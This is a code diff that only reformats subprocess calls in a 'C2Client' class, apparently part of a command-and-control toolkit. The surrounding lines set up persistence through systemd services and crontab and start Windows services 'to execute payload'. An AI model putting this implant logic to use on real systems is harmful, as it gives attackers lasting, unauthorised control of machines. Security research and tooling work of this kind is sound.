@@ -1246,11 +1246,17 @@ class C2Client(BaseC2):
             try:
                 if os.name == "nt":
                     result = subprocess.run(
-                        ["tasklist"], check=False, capture_output=True, text=True  # noqa: S607
+                        ["tasklist"],
+                        check=False,
+                        capture_output=True,
+                        text=True,  # noqa: S607
                     )
                 else:
                     result = subprocess.run(
-                        ["ps", "aux"], check=False, capture_output=True, text=True  # noqa: S607
+                        ["ps", "aux"],
+                        check=False,
+                        capture_output=True,
+                        text=True,  # noqa: S607
                     )
                 return {"raw_output": result.stdout}
             except (
@@ -1559,7 +1565,8 @@ WantedBy=multi-user.target
                         # Enable and start service
                         subprocess.run(["systemctl", "daemon-reload"], check=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
                         subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                            ["systemctl", "enable", f"{service_name.lower()}.service"], check=True  # noqa: S607
+                            ["systemctl", "enable", f"{service_name.lower()}.service"],
+                            check=True,  # noqa: S607
                         )
 
                         results["success"] = True
@@ -1592,7 +1599,10 @@ WantedBy=multi-user.target
 
                         # Add to user's crontab
                         result = subprocess.run(
-                            ["crontab", "-l"], check=False, capture_output=True, text=True  # noqa: S607
+                            ["crontab", "-l"],
+                            check=False,
+                            capture_output=True,
+                            text=True,  # noqa: S607
                         )
                         existing_cron = result.stdout if result.returncode == 0 else ""
 
@@ -2905,7 +2915,10 @@ WantedBy=multi-user.target
             if result.returncode == 0:
                 # Try to start service to execute payload
                 subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                    ["sc", "start", service_name], check=False, capture_output=True, text=True  # noqa: S607
+                    ["sc", "start", service_name],
+                    check=False,
+                    capture_output=True,
+                    text=True,  # noqa: S607
                 )
 
                 return {
@@ -2969,10 +2982,14 @@ WantedBy=multi-user.target
 
                                 # Restart service
                                 subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "stop", service_name], check=False, capture_output=True  # noqa: S607
+                                    ["sc", "stop", service_name],
+                                    check=False,
+                                    capture_output=True,  # noqa: S607
                                 )
                                 subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "start", service_name], check=False, capture_output=True  # noqa: S607
+                                    ["sc", "start", service_name],
+                                    check=False,
+                                    capture_output=True,  # noqa: S607
                                 )
 
                                 return {
@@ -3035,7 +3052,9 @@ WantedBy=multi-user.target
 
                                 # Restart service
                                 stop_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "stop", service_name], check=False, capture_output=True  # noqa: S607
+                                    ["sc", "stop", service_name],
+                                    check=False,
+                                    capture_output=True,  # noqa: S607
                                 )
                                 start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                     ["sc", "start", service_name],  # noqa: S607
